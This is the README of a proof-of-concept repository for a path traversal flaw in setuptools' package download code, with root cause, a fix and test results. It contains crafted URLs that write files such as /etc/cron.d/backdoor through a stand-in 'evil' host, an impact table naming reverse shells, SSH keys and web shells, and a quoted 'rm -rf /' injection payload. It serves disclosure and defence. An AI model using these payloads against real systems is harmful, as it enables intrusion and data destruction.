# Setuptools Path Traversal Vulnerability

**Arbitrary file write via absolute path injection in `package_index.py`**

## Quick Start

```bash
# Run in Docker
docker build -t setuptools-cve-poc .
docker run --rm setuptools-cve-poc

# Or locally (requires setuptools 78.1.0)
pip install setuptools==78.1.0
python poc_direct_download.py
```

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Component** | `setuptools/package_index.py:810-825` |
| **Function** | `PackageIndex._download_url()` |
| **Type** | Path Traversal (CWE-22) |
| **Impact** | Arbitrary File Write |
| **Tested Version** | setuptools 78.1.0 |

## The Bug

```python
# setuptools/package_index.py lines 810-825

def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)  # Returns "/etc/passwd" from %2Fetc%2Fpasswd
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')  # Only sanitizes ".."

    filename = os.path.join(tmpdir, name)  # os.path.join ignores tmpdir when name is absolute!

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

**Root Cause:** `os.path.join("/tmp/safe", "/etc/passwd")` returns `"/etc/passwd"` - the first argument is ignored when the second is absolute.

## Attack Flow

```
Malicious URL                         Extracted Filename         Final Path
─────────────────────────────────     ──────────────────         ──────────────────
http://evil/%2Fetc%2Fcron.d%2Fjob  →  /etc/cron.d/job         →  /etc/cron.d/job
             └─────────┬─────────┘
            URL-encoded absolute path
            decoded by egg_info_for_url()
```

## Proof of Concept

```
$ python poc_direct_download.py

=================================================================
DIRECT PROOF: _download_url() path traversal vulnerability
=================================================================

[1] Malicious URL: http://127.0.0.1:35737/pkg/%2Ftmp%2FCVE_PROOF.txt
    Last component: %2Ftmp%2FCVE_PROOF.txt

[2] egg_info_for_url() extracts: '/tmp/CVE_PROOF.txt'

[3] Intended download dir: /tmp/tmp1uygg9cz
    os.path.join(tmpdir, name) = '/tmp/CVE_PROOF.txt'
    ^^^ tmpdir is IGNORED because name is absolute!

[4] Calling PackageIndex()._download_url(url, tmpdir)...
    Returned: /tmp/CVE_PROOF.txt

[5] Checking /tmp/CVE_PROOF.txt...

=================================================================
VULNERABILITY CONFIRMED!
=================================================================
File written to: /tmp/CVE_PROOF.txt
```

## Files

| File | Description |
|------|-------------|
| [RESEARCH.md](RESEARCH.md) | **Deep dive technical analysis** |
| [poc_direct_download.py](poc_direct_download.py) | Simplest PoC - direct function call |
| [poc_path_traversal.py](poc_path_traversal.py) | Basic PoC with HTTP server |
| [poc_realistic_attack.py](poc_realistic_attack.py) | Simulated malicious package index |
| [poc_full_easy_install.py](poc_full_easy_install.py) | Full easy_install attack chain |
| [malicious_index_server.py](malicious_index_server.py) | Standalone malicious PyPI server |
| [test_path_traversal_security.py](test_path_traversal_security.py) | 45 security test cases |
| [Dockerfile](Dockerfile) | Containerized PoC |

## Attack Scenarios

### 1. Compromised Private Package Index (Most Likely)

```bash
# Enterprise pip.conf
[global]
index-url = https://pypi.internal.company.com/simple/

# Attacker compromises internal index, serves:
# <a href="/%2Fetc%2Fcron.d%2Fbackdoor">requests-2.28.0.tar.gz</a>

# Developer updates packages:
pip install --upgrade requests
# Result: /etc/cron.d/backdoor written with attacker payload
```

### 2. Dependency Confusion with Legacy Tools

```bash
# Attacker registers "internal-company-lib" on public PyPI
# Package metadata contains malicious URLs

# Victim's legacy build system:
easy_install internal-company-lib
# Result: Arbitrary file written via path traversal
```

## Impact

An attacker can write files to any location writable by the user:

| Target | Impact |
|--------|--------|
| `/etc/cron.d/backdoor` | Scheduled reverse shell |
| `~/.ssh/authorized_keys` | SSH access |
| `~/.bashrc` | Code execution on login |
| `/var/www/html/shell.php` | Web shell |

## Affected Code Path

```
PackageIndex._download_url()     ← Vulnerable function
    │
    ├── egg_info_for_url()       ← Extracts & decodes filename
    │
    ├── while '..' in name       ← Only sanitizes "..", not absolute paths
    │
    ├── os.path.join()           ← Ignores tmpdir for absolute paths
    │
    └── _download_other()
            │
            └── _download_to()   ← Writes file to attacker-controlled path
```

## Fix

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')

        # FIX: Strip absolute path prefixes
        if os.path.isabs(name):
            name = name.lstrip('/\\')

        # FIX: Handle Windows drive letters
        if len(name) > 1 and name[1] == ':':
            name = name[0] + '_' + name[2:]
    else:
        name = "__downloaded__"

    filename = os.path.join(tmpdir, name)

    # FIX: Validate path is under tmpdir
    if not os.path.realpath(filename).startswith(os.path.realpath(tmpdir) + os.sep):
        raise DistutilsError(f"Path escapes download directory: {filename}")

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

## Test Results

```
$ python -m pytest test_path_traversal_security.py -v

=================== 40 passed, 4 skipped, 1 xfailed ===================

- 40 passed: Document current vulnerable behavior
- 4 skipped: Windows-specific tests (on Linux)
- 1 xfailed: Will pass once vulnerability is fixed
```

## Related Work

This is a **different vulnerability** from the March 2024 command injection report:

| | March 2024 Report | This Research |
|--|-------------------|---------------|
| **Type** | Command Injection | Path Traversal |
| **Vector** | Shell metacharacters in git:// URLs | URL-encoded absolute paths |
| **Payload** | `git://host; rm -rf /` | `http://host/%2Fetc%2Fpasswd` |
| **Root Cause** | Unsanitized shell execution | Missing absolute path check |

## References

- [RESEARCH.md](RESEARCH.md) - Full technical deep dive
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Python os.path.join docs](https://docs.python.org/3/library/os.path.html#os.path.join)
- [setuptools GitHub](https://github.com/pypa/setuptools)

## Disclaimer

This research is for educational and authorized security testing purposes only.
